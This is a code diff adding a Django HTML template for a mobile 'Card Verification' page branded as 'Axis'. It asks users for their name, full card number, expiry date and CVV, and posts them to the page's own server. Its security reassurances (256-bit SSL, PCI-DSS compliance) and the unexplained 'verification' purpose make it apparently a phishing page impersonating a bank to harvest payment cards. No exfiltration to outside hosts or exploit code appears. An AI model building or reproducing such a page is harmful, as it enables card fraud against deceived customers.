@@ -1,0 +1,546 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Verification</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100%;
+            background-color: #f5f5f5;
+            font-family: Arial, Helvetica, sans-serif;
+            overflow-x: hidden;
+        }
+
+        /* Main Container */
+        .mobile-page {
+            width: 100%;
+            max-width: 500px;
+            min-height: 100vh;
+            margin: 0 auto;
+            background: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Top Header */
+        .top-section {
+            position: relative;
+            text-align: center;
+            color: white;
+            background: linear-gradient(145deg, #b52c68 0%, #c73f79 45%, #d15b91 100%);
+            border-radius: 0 0 28px 28px;
+            padding: clamp(35px, 8vw, 55px) 20px 30px;
+        }
+
+        .back-button {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 40px;
+            height: 40px;
+            border: none;
+            background: transparent;
+            color: white;
+            font-size: 28px;
+            line-height: 1;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .header-card {
+            width: 50px;
+            height: 32px;
+            position: relative;
+            margin: 0 auto 16px;
+            border-radius: 4px;
+            background: #ffd400;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15);
+        }
+
+        .header-black-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: #262626;
+        }
+
+        .header-white-line {
+            position: absolute;
+            left: 6px;
+            bottom: 6px;
+            width: 32px;
+            height: 6px;
+            border-radius: 2px;
+            background: white;
+        }
+
+        .top-section h1 {
+            margin: 0;
+            font-size: clamp(20px, 6vw, 26px);
+            line-height: 1.2;
+            font-weight: 700;
+        }
+
+        .top-section p {
+            margin: 8px 0 0;
+            font-size: clamp(13px, 3.5vw, 16px);
+            color: #eeeeee;
+        }
+
+        /* Description */
+        .description {
+            padding: 20px 20px 16px;
+            color: #555;
+            font-size: clamp(14px, 3.8vw, 16px);
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        /* Credit Card Graphic */
+        .credit-card {
+            position: relative;
+            width: calc(100% - 40px);
+            margin: 0 auto 20px;
+            padding: clamp(16px, 4vw, 24px);
+            border-radius: 16px;
+            color: white;
+            background: linear-gradient(135deg, #285da1, #3477b8);
+            box-shadow: 0 5px 13px rgba(0, 0, 0, 0.14);
+            aspect-ratio: 1.586 / 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .credit-card-logo {
+            width: 42px;
+            height: 28px;
+            position: relative;
+            border-radius: 4px;
+            background: #ffd400;
+        }
+
+        .logo-black {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: #272727;
+        }
+
+        .logo-white {
+            position: absolute;
+            left: 6px;
+            bottom: 5px;
+            width: 28px;
+            height: 5px;
+            border-radius: 1px;
+            background: white;
+        }
+
+        .card-number {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            font-size: clamp(14px, 4.5vw, 18px);
+            letter-spacing: 2px;
+            white-space: nowrap;
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .card-label {
+            margin-bottom: 4px;
+            color: #cad8e9;
+            font-size: clamp(10px, 2.8vw, 12px);
+        }
+
+        .card-name-preview {
+            font-size: clamp(12px, 3.5vw, 15px);
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            max-width: 180px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .card-expiry {
+            text-align: right;
+        }
+
+        .expiry-preview {
+            font-size: clamp(12px, 3.5vw, 15px);
+            font-weight: 700;
+        }
+
+        /* Form Card */
+        .form-card {
+            margin: 0 20px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 3px 13px rgba(0, 0, 0, 0.08);
+            padding-bottom: 20px;
+        }
+
+        .form-header {
+            height: 56px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 0 20px;
+            border-bottom: 1px solid #e7e7e7;
+        }
+
+        .form-header h2 {
+            margin: 0;
+            color: #222;
+            font-size: clamp(16px, 4vw, 18px);
+        }
+
+        .form-card-icon {
+            width: 30px;
+            height: 20px;
+            position: relative;
+            border-radius: 3px;
+            background: #ffd400;
+        }
+
+        .form-card-icon::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: #292929;
+        }
+
+        .form-card-icon div {
+            position: absolute;
+            left: 5px;
+            bottom: 4px;
+            width: 20px;
+            height: 4px;
+            background: white;
+        }
+
+        /* Inputs */
+        .form-group {
+            margin: 16px 20px 0;
+        }
+
+        .form-group label,
+        .bottom-row label {
+            display: block;
+            margin-bottom: 6px;
+            color: #252525;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .input-box {
+            width: 100%;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            background: #fafbfc;
+            border: 1.5px solid #e0e3e7;
+            border-radius: 12px;
+            transition: border-color 0.2s, background 0.2s;
+        }
+
+        .input-box:focus-within {
+            border-color: #b52c68;
+            background: white;
+        }
+
+        .input-box input {
+            width: 100%;
+            height: 100%;
+            outline: none;
+            border: none;
+            background: transparent;
+            color: #333;
+            font-size: 16px;
+        }
+
+        .input-box input::placeholder {
+            color: #b7bbc0;
+            opacity: 1;
+        }
+
+        .user-icon,
+        .card-input-icon,
+        .input-symbol {
+            margin-right: 10px;
+            font-size: 18px;
+            color: #888;
+            display: flex;
+            align-items: center;
+        }
+
+        .bottom-row {
+            display: flex;
+            gap: 12px;
+            margin: 16px 20px 0;
+        }
+
+        .expiry-group,
+        .cvv-group {
+            flex: 1;
+        }
+
+        /* Button */
+        .verify-button {
+            width: calc(100% - 40px);
+            height: 54px;
+            margin: 20px 20px 0;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #b51e5c, #c12b68);
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: transform 0.15s, background 0.15s;
+        }
+
+        .verify-button:hover {
+            background: #a91e58;
+        }
+
+        .verify-button:active {
+            transform: scale(0.98);
+        }
+
+        /* Security */
+        .security-section {
+            text-align: center;
+            padding: 20px 20px 30px;
+            margin-top: auto;
+        }
+
+        .security-title {
+            color: #218b73;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .security-section p {
+            margin: 8px 0 0;
+            color: #777;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        @media (max-width: 360px) {
+            .credit-card {
+                width: calc(100% - 32px);
+            }
+            .form-card {
+                margin: 0 16px;
+            }
+            .verify-button {
+                width: calc(100% - 32px);
+                margin-left: 16px;
+                margin-right: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="mobile-page">
+
+    <!-- HEADER -->
+    <section class="top-section">
+        <button class="back-button" type="button" onclick="history.back()">←</button>
+
+        <div class="header-card">
+            <div class="header-black-line"></div>
+            <div class="header-white-line"></div>
+        </div>
+
+        <h1>Card Verification</h1>
+        <p>Secure 256-bit SSL Encryption</p>
+    </section>
+
+    <!-- DESCRIPTION -->
+    <div class="description">
+        Please provide your credit card details below securely to complete the verification process.
+    </div>
+
+    <!-- CREDIT CARD PREVIEW -->
+    <div class="credit-card">
+        <div class="credit-card-logo">
+            <div class="logo-black"></div>
+            <div class="logo-white"></div>
+        </div>
+
+        <div class="card-number" id="cardNumberPreview">
+            <span>••••</span>
+            <span>••••</span>
+            <span>••••</span>
+            <span>••••</span>
+        </div>
+
+        <div class="card-details">
+            <div class="card-holder">
+                <div class="card-label">Cardholder Name</div>
+                <div class="card-name-preview" id="cardNamePreview">CARDHOLDER NAME</div>
+            </div>
+
+            <div class="card-expiry">
+                <div class="card-label">Expiry</div>
+                <div class="expiry-preview" id="expiryPreview">MM/YY</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FORM CARD -->
+    <form class="form-card" method="POST" action="">
+        {% csrf_token %}
+
+        <div class="form-header">
+            <div class="form-card-icon">
+                <div></div>
+            </div>
+            <h2>Card Information</h2>
+        </div>
+
+        <!-- NAME -->
+        <div class="form-group">
+            <label for="name">Name on Card</label>
+            <div class="input-box">
+                <span class="user-icon">👤</span>
+                <input id="name" name="card_holder_name" type="text" placeholder="e.g. JOHN DOE" autocomplete="off" maxlength="40" required>
+            </div>
+        </div>
+
+        <!-- CARD NUMBER -->
+        <div class="form-group">
+            <label for="cardNumber">Card Number</label>
+            <div class="input-box">
+                <span class="card-input-icon">💳</span>
+                <input id="cardNumber" name="card_number" type="tel" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" required>
+            </div>
+        </div>
+
+        <!-- EXPIRY + CVV -->
+        <div class="bottom-row">
+            <div class="expiry-group">
+                <label for="expiry">Expiry Date</label>
+                <div class="input-box">
+                    <span class="input-symbol">◈</span>
+                    <input id="expiry" name="card_expiry" type="tel" placeholder="MM/YY" maxlength="5" autocomplete="off" required>
+                </div>
+            </div>
+
+            <div class="cvv-group">
+                <label for="cvv">CVV</label>
+                <div class="input-box">
+                    <span class="input-symbol">◈</span>
+                    <input id="cvv" name="card_cvv" type="password" placeholder="***" maxlength="4" autocomplete="off" required>
+                </div>
+            </div>
+        </div>
+
+        <!-- SUBMIT BUTTON -->
+        <button class="verify-button" type="submit">
+            <span>🛡</span> Verify Securely
+        </button>
+    </form>
+
+    <!-- SECURITY FOOTER -->
+    <div class="security-section">
+        <div class="security-title">
+            <span>🛡</span> 256-bit SSL Encrypted Connection
+        </div>
+        <p>Axis follows strict international PCI-DSS compliance guidelines to ensure your card details remain absolutely secure.</p>
+    </div>
+
+</div>
+
+<!-- JAVASCRIPT -->
+<script>
+    const nameInput = document.getElementById("name");
+    const expiryInput = document.getElementById("expiry");
+    const cardNumberInput = document.getElementById("cardNumber");
+    
+    const cardNamePreview = document.getElementById("cardNamePreview");
+    const expiryPreview = document.getElementById("expiryPreview");
+    const cardNumberPreview = document.getElementById("cardNumberPreview");
+
+    // Live Name Preview
+    nameInput.addEventListener("input", function () {
+        const value = this.value.trim();
+        cardNamePreview.textContent = value === "" ? "CARDHOLDER NAME" : value.toUpperCase();
+    });
+
+    // Format Card Number & Live Preview Update
+    cardNumberInput.addEventListener("input", function () {
+        let value = this.value.replace(/\D/g, "");
+        value = value.substring(0, 16);
+        const groups = value.match(/.{1,4}/g);
+        this.value = groups ? groups.join(" ") : "";
+
+        // Update Card Preview Digits
+        const digits = value.padEnd(16, "•");
+        const formattedGroups = digits.match(/.{1,4}/g);
+        cardNumberPreview.innerHTML = `
+            <span>${formattedGroups[0]}</span>
+            <span>${formattedGroups[1]}</span>
+            <span>${formattedGroups[2]}</span>
+            <span>${formattedGroups[3]}</span>
+        `;
+    });
+
+    // Format Expiry Date MM/YY
+    expiryInput.addEventListener("input", function () {
+        let value = this.value.replace(/\D/g, "");
+        value = value.substring(0, 4);
+
+        if (value.length > 2) {
+            value = value.substring(0, 2) + "/" + value.substring(2);
+        }
+
+        this.value = value;
+        expiryPreview.textContent = value || "MM/YY";
+    });
+</script>
+
+</body>
+</html>
